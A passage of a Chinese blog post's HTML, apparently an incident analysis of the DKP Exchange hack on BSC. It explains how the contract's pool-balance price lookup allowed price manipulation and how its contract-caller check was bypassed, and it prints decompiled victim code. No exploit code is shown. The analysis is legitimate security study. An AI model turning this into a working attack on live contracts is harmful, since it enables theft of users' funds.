@@ -1,0 +1,785 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>DKP Exchange 攻击事件分析 - YINHUI&#39;s BLOG</title><meta name="Description" content="银辉的博客"><meta property="og:title" content="DKP Exchange 攻击事件分析" />
+<meta property="og:description" content="DKP Exchange 攻击事件分析" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://yinhui1984.github.io/dpk-exchange-attack/" /><meta property="og:image" content="https://yinhui1984.github.io/avatar.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-03-24T20:16:27+08:00" />
+<meta property="article:modified_time" content="2023-03-24T20:16:27+08:00" /><meta property="og:site_name" content="YINHUI&#39;s BLOG" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://yinhui1984.github.io/avatar.png"/>
+
+<meta name="twitter:title" content="DKP Exchange 攻击事件分析"/>
+<meta name="twitter:description" content="DKP Exchange 攻击事件分析"/>
+<meta name="application-name" content="YINHUI&#39;s BLOG">
+<meta name="apple-mobile-web-app-title" content="YINHUI&#39;s BLOG"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://yinhui1984.github.io/dpk-exchange-attack/" /><link rel="prev" href="https://yinhui1984.github.io/euler-finance-attack/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "DKP Exchange 攻击事件分析",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/yinhui1984.github.io\/dpk-exchange-attack\/"
+        },"genre": "posts","keywords": "defi","wordcount":  2374 ,
+        "url": "https:\/\/yinhui1984.github.io\/dpk-exchange-attack\/","datePublished": "2023-03-24T20:16:27+08:00","dateModified": "2023-03-24T20:16:27+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "yinhui"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="YINHUI&#39;s BLOG"></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/"> 首页 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="YINHUI&#39;s BLOG"></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/" title="">首页</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">DKP Exchange 攻击事件分析</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/yinhui1984" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>yinhui</a></span>&nbsp;<span class="post-category">included in <a href="/categories/security/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>security</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-03-24">2023-03-24</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2374 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#背景">背景</a></li>
+    <li><a href="#代码分析">代码分析</a>
+      <ul>
+        <li><a href="#重点代码1">重点代码1</a></li>
+        <li><a href="#重点代码2">重点代码2</a></li>
+      </ul>
+    </li>
+    <li><a href="#漏洞利用">漏洞利用</a>
+      <ul>
+        <li><a href="#价格操纵">价格操纵</a></li>
+        <li><a href="#绕过合约检查">绕过合约检查</a></li>
+      </ul>
+    </li>
+    <li><a href="#poc">POC</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>DKP Exchange 攻击事件分析</p>
+<h2 id="背景">背景</h2>
+<p>攻击tx: <a href="https://bscscan.com/tx/0x0c850f54c1b497c077109b3d2ef13c042bb70f7f697201bcf2a4d0cb95e74271" target="_blank" rel="noopener noreffer ">https://bscscan.com/tx/0x0c850f54c1b497c077109b3d2ef13c042bb70f7f697201bcf2a4d0cb95e74271</a></p>
+<p>获利tx: <a href="https://bscscan.com/tx/0x2d31e45dce58572a99c51357164dc5283ff0c02d609250df1e6f4248bd62ee01" target="_blank" rel="noopener noreffer ">https://bscscan.com/tx/0x2d31e45dce58572a99c51357164dc5283ff0c02d609250df1e6f4248bd62ee01</a></p>
+<p><a href="https://bscscan.com/address/0x89257A52Ad585Aacb1137fCc8abbD03a963B9683" target="_blank" rel="noopener noreffer ">DKP Exchange 合约</a>提供了 <a href="https://bscscan.com/address/0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19" target="_blank" rel="noopener noreffer ">DKP token</a> 和 <a href="https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955" target="_blank" rel="noopener noreffer ">BUSD</a>的交换功能 , 但在其交换函数(exchange)中使用了错误的DKP token的价格查询逻辑, 而遭到了黑客的价格操纵攻击. 虽然合约在交换函数中做了&quot;不允许合约(CA)而只允许外部账户(EOA)调用交换函数&quot;, 但被轻松绕过了</p>
+<h2 id="代码分析">代码分析</h2>
+<p>DKP Exchange 的代码并没有verify, 所以只能看到字节码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x608060405234801561001057600080fd5b50600436106101c45760003560e01c8063961bdfbf116100f9578063d42568f711610097578063e6db271311610071578063e6db2713146104bf578063f2fde38b146104dd578063fd19016c146104f9578063fdc65aa714610517576101c4565b8063d42568f714610455578063e176895e14610471578063e274a7bc146104a1576101c4565b8063b2d34d55116100d3578063b2d34d55146103cd578063bb11049f146103fd57806......
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>到https://bscscan.com/address/0x89257A52Ad585Aacb1137fCc8abbD03a963B9683#code 查看完整代码</p>
+</blockquote>
+<p>但可以使用反编译工具反编译一下</p>
+<blockquote>
+<p>这里查看完整的反编译后的代码: <a href="https://github.com/yinhui1984/imagehosting/blob/main/images/1679661755618031000.sol" target="_blank" rel="noopener noreffer ">https://github.com/yinhui1984/imagehosting/blob/main/images/1679661755618031000.sol</a></p>
+</blockquote>
+<p>其<code>exchange()</code>函数如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">exchange</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">varg0</span><span class="p">)</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="mi">4</span> <span class="o">+</span> <span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">data</span><span class="p">.</span><span class="n">length</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">&gt;=</span> <span class="mi">32</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x2a44</span><span class="p">(</span><span class="n">varg0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">//重点代码1
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">.</span><span class="nb">code</span><span class="p">.</span><span class="n">size</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">Error</span><span class="p">(</span><span class="s">&#39;no isContract&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">varg0</span> <span class="o">&gt;=</span> <span class="n">stor_9</span><span class="p">,</span> <span class="n">Error</span><span class="p">(</span><span class="s">&#39;num &gt;= propor&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v0</span> <span class="o">=</span> <span class="n">_SafeAdd</span><span class="p">(</span><span class="n">varg0</span><span class="p">,</span> <span class="n">owner_a</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">owner_a</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">=</span> <span class="n">v0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x1a69</span><span class="p">(</span><span class="n">varg0</span><span class="p">,</span> <span class="n">stor_10_0_19</span><span class="p">,</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">_usdt</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">owner_e_0_19</span><span class="p">.</span><span class="nb">code</span><span class="p">.</span><span class="n">size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v1</span><span class="p">,</span> <span class="n">v2</span><span class="p">,</span> <span class="n">v3</span><span class="p">,</span> <span class="n">v4</span> <span class="o">=</span> <span class="n">owner_e_0_19</span><span class="p">.</span><span class="n">staticcall</span><span class="p">(</span><span class="mh">0xbd52993b</span><span class="p">,</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">).</span><span class="nb">gas</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">gas</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">v1</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">=</span> <span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">+</span> <span class="p">(</span><span class="n">RETURNDATASIZE</span><span class="p">()</span> <span class="o">+</span> <span class="mi">31</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0x1f</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">+</span> <span class="n">RETURNDATASIZE</span><span class="p">()</span> <span class="o">-</span> <span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="mi">96</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x2a16</span><span class="p">(</span><span class="n">v2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x2a16</span><span class="p">(</span><span class="n">v3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x2a16</span><span class="p">(</span><span class="n">v4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">//重点代码2
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">v5</span> <span class="o">=</span> <span class="mh">0x1201</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">v6</span> <span class="o">=</span> <span class="mh">0x1af2</span><span class="p">(</span><span class="n">varg0</span><span class="p">,</span> <span class="n">v5</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v7</span> <span class="o">=</span> <span class="mh">0x1b6d</span><span class="p">(</span><span class="mh">0xde0b6b3a7640000</span><span class="p">,</span> <span class="n">v6</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v8</span> <span class="o">=</span> <span class="n">v9</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">v2</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">v10</span> <span class="o">=</span> <span class="mh">0x1af2</span><span class="p">(</span><span class="n">_one</span><span class="p">,</span> <span class="n">v7</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">v11</span> <span class="o">=</span> <span class="mh">0x1b6d</span><span class="p">(</span><span class="n">_exchange</span><span class="p">,</span> <span class="n">v10</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">v8</span> <span class="o">=</span> <span class="n">v12</span> <span class="o">=</span> <span class="n">_SafeAdd</span><span class="p">(</span><span class="n">v11</span><span class="p">,</span> <span class="n">v9</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">v13</span> <span class="o">=</span> <span class="n">_SafeAdd</span><span class="p">(</span><span class="n">v11</span><span class="p">,</span> <span class="n">owner_b</span><span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="n">v2</span><span class="p">)]);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">owner_b</span><span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="n">v2</span><span class="p">)]</span> <span class="o">=</span> <span class="n">v13</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">v3</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">v14</span> <span class="o">=</span> <span class="mh">0x1af2</span><span class="p">(</span><span class="n">stor_6</span><span class="p">,</span> <span class="n">v7</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">v15</span> <span class="o">=</span> <span class="mh">0x1b6d</span><span class="p">(</span><span class="n">_exchange</span><span class="p">,</span> <span class="n">v14</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">v8</span> <span class="o">=</span> <span class="n">v16</span> <span class="o">=</span> <span class="n">_SafeAdd</span><span class="p">(</span><span class="n">v15</span><span class="p">,</span> <span class="n">v8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">v17</span> <span class="o">=</span> <span class="n">_SafeAdd</span><span class="p">(</span><span class="n">v15</span><span class="p">,</span> <span class="n">owner_b</span><span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="n">v3</span><span class="p">)]);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">owner_b</span><span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="n">v3</span><span class="p">)]</span> <span class="o">=</span> <span class="n">v17</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">v4</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">v18</span> <span class="o">=</span> <span class="mh">0x1af2</span><span class="p">(</span><span class="n">_three</span><span class="p">,</span> <span class="n">v7</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">v19</span> <span class="o">=</span> <span class="mh">0x1b6d</span><span class="p">(</span><span class="n">_exchange</span><span class="p">,</span> <span class="n">v18</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">v8</span> <span class="o">=</span> <span class="n">v20</span> <span class="o">=</span> <span class="n">_SafeAdd</span><span class="p">(</span><span class="n">v19</span><span class="p">,</span> <span class="n">v8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">v21</span> <span class="o">=</span> <span class="n">_SafeAdd</span><span class="p">(</span><span class="n">v19</span><span class="p">,</span> <span class="n">owner_b</span><span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="n">v4</span><span class="p">)]);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">owner_b</span><span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="n">v4</span><span class="p">)]</span> <span class="o">=</span> <span class="n">v21</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v22</span> <span class="o">=</span> <span class="mh">0x1af2</span><span class="p">(</span><span class="n">stor_8</span><span class="p">,</span> <span class="n">v7</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v23</span> <span class="o">=</span> <span class="mh">0x1b6d</span><span class="p">(</span><span class="n">_exchange</span><span class="p">,</span> <span class="n">v22</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v24</span> <span class="o">=</span> <span class="n">_SafeAdd</span><span class="p">(</span><span class="n">v23</span><span class="p">,</span> <span class="n">v8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x1972</span><span class="p">(</span><span class="n">v23</span><span class="p">,</span> <span class="n">stor_f_0_19</span><span class="p">,</span> <span class="n">stor_3_0_19</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v25</span> <span class="o">=</span> <span class="n">_SafeSub</span><span class="p">(</span><span class="n">v24</span><span class="p">,</span> <span class="n">v7</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x1972</span><span class="p">(</span><span class="n">v25</span><span class="p">,</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">stor_3_0_19</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="重点代码1">重点代码1</h3>
+<p>合约中 <code>require(msg.sender.code.size &lt;= 0, Error('no isContract'));</code> 这行代码是检查函数调用者不能是合约, 开发者还是有一点安全意识的(但不多), 怕被黑干脆不让合约调用.</p>
+<h3 id="重点代码2">重点代码2</h3>
+<p><code>v5 = 0x1201();</code> 转到函数 0x1201代码如下:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="mh">0x1201</span><span class="p">()</span> <span class="k">private</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">stor_3_0_19</span><span class="p">.</span><span class="nb">code</span><span class="p">.</span><span class="n">size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v0</span><span class="p">,</span> <span class="n">v1</span> <span class="o">=</span> <span class="n">stor_3_0_19</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">_lp</span><span class="p">).</span><span class="nb">gas</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">gas</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">v0</span><span class="p">);</span> <span class="c1">// checks call status, propagates error data on error
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">=</span> <span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">+</span> <span class="p">(</span><span class="n">RETURNDATASIZE</span><span class="p">()</span> <span class="o">+</span> <span class="mi">31</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0x1f</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">+</span> <span class="n">RETURNDATASIZE</span><span class="p">()</span> <span class="o">-</span> <span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="mi">32</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x2a44</span><span class="p">(</span><span class="n">v1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">_usdt</span><span class="p">.</span><span class="nb">code</span><span class="p">.</span><span class="n">size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v2</span><span class="p">,</span> <span class="n">v3</span> <span class="o">=</span> <span class="n">_usdt</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">_lp</span><span class="p">).</span><span class="nb">gas</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">gas</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">v2</span><span class="p">);</span> <span class="c1">// checks call status, propagates error data on error
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">=</span> <span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">+</span> <span class="p">(</span><span class="n">RETURNDATASIZE</span><span class="p">()</span> <span class="o">+</span> <span class="mi">31</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0x1f</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">+</span> <span class="n">RETURNDATASIZE</span><span class="p">()</span> <span class="o">-</span> <span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="mi">32</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x2a44</span><span class="p">(</span><span class="n">v3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v4</span> <span class="o">=</span> <span class="mh">0x1af2</span><span class="p">(</span><span class="mh">0xde0b6b3a7640000</span><span class="p">,</span> <span class="n">v1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v5</span> <span class="o">=</span> <span class="mh">0x1b6d</span><span class="p">(</span><span class="n">v3</span><span class="p">,</span> <span class="n">v4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">v5</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其中<code>0x1b6d</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="mh">0x1b6d</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">varg0</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">varg1</span><span class="p">)</span> <span class="k">private</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">varg0</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="n">Error</span><span class="p">(</span><span class="s">&#39;SafeMath: division by zero&#39;</span><span class="p">));</span>
